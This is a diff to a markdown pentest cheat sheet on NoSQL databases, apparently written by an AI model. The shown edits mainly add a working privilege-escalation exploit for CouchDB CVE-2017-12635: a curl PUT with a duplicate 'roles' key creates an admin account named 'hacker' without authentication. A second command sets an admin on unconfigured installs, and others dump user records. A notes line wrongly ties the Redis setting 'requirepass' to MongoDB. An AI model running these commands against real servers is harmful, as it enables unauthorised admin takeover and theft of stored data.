@@ -145,12 +145,15 @@ curl http://192.168.1.10:5984/_all_dbs
 # Dump a database
 curl http://192.168.1.10:5984/_users/_all_docs?include_docs=true
 
-# CVE-2017-12635 — create admin user (no auth required on vulnerable versions)
+# CVE-2017-12635 — create admin user (no auth, CouchDB < 1.7.0 / < 2.1.1).
+# The DUPLICATE "roles" key is the whole exploit: the Erlang store keeps ["_admin"],
+# the JS validator only sees the trailing [] and lets the "Only _admin may set roles" check pass.
 curl -X PUT http://192.168.1.10:5984/_users/org.couchdb.user:hacker \
   -H "Content-Type: application/json" \
-  -d '{"type": "user", "name": "hacker", "roles": ["_admin"], "password": "hacker"}'
+  -d '{"type":"user","name":"hacker","roles":["_admin"],"roles":[],"password":"hacker"}'
+# A single "roles":["_admin"] (no duplicate) is REJECTED — the trick is mandatory.
 
-# Create admin via exploit endpoint
+# CouchDB 1.x "Admin Party" (no admin ever configured) — set an admin the normal way, unauthenticated:
 curl -X PUT http://192.168.1.10:5984/_config/admins/hacker -d '"hacker"'
 ```
 
@@ -200,7 +203,7 @@ while True:
 
 - NoSQLMap sends many probe requests — noisy, will trigger WAF/IDS
 - Direct MongoDB/Redis access leaves connection records in DB logs
-- MongoDB 4.0+ enables auth by default — older versions (3.x and below) are common unauthenticated finds
+- MongoDB does **not** enable auth by default in any release — `--auth` / `security.authorization` is always opt-in. What changed at 3.6 is the default *bind* (localhost-only), so remotely-reachable instances with no `requirepass`/auth remain a common find, especially on legacy/containerized deploys that bind `0.0.0.0`
 - CouchDB "Admin Party" (no admin set) was fixed in 3.x but legacy installs still appear
 
 ---
@@ -210,5 +213,5 @@ while True:
 ---
 
 *Created: 2026-03-06*
-*Updated: 2026-09-22*
+*Updated: 2026-09-29*
 *Model: claude-opus-4-8*
